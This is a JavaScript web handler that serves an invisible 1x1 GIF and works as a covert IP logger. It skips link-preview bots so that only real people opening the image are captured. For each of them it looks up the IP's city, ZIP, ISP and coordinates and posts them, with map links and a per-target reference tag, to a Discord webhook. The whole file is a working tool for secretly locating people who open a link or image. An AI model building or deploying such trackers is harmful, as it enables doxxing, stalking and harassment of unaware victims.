const PIXEL = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

export default async function handler(req, res) {
  const ip =
    req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    'unknown';

  const ua = req.headers['user-agent'] || '';
  const tag = req.query.ref || '';
  const isCrawler = /discordbot|twitterbot|facebookexternalhit|slackbot|whatsapp|telegrambot|linkedinbot|skypeuripreview|embedly/i.test(ua);

  if (!isCrawler && ip !== 'unknown' && !ip.startsWith('127.') && !ip.startsWith('10.')) {
    let geo = {};
    try {
      const r = await fetch(
        `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,query`
      );
      geo = await r.json();
    } catch {}

    const fields = [
      { name: 'IP', value: `\`${ip}\``, inline: true },
      { name: 'Country', value: geo.country ? `${geo.country} (${geo.countryCode})` : '—', inline: true },
      { name: 'Region', value: geo.regionName || '—', inline: true },
      { name: 'City', value: geo.city || '—', inline: true },
      { name: 'ZIP', value: geo.zip || '—', inline: true },
      { name: 'ISP', value: geo.isp || '—', inline: true },
      { name: 'Org', value: geo.org || '—', inline: false },
      { name: 'ASN', value: geo.as || '—', inline: false },
      { name: 'Coords', value: geo.lat && geo.lon ? `${geo.lat}, ${geo.lon}` : '—', inline: false },
      { name: 'Ref tag', value: tag || '—', inline: true },
      { name: 'Time', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
      { name: 'User-Agent', value: ua.slice(0, 900) || '—', inline: false },
    ];
    if (geo.lat && geo.lon) {
      fields.push({
        name: 'Map',
        value: `[OSM](https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}#map=12/${geo.lat}/${geo.lon}) · [Google](https://www.google.com/maps?q=${geo.lat},${geo.lon})`,
        inline: false,
      });
    }

    fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'pixel',
        embeds: [{
          title: 'pixel hit',
          color: 0xff7a00,
          fields,
          footer: { text: `ref: ${tag || 'none'}` },
          timestamp: new Date().toISOString(),
        }],
      }),
    }).catch(e => console.error('webhook', e));
  }

  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  return res.status(200).send(PIXEL);
}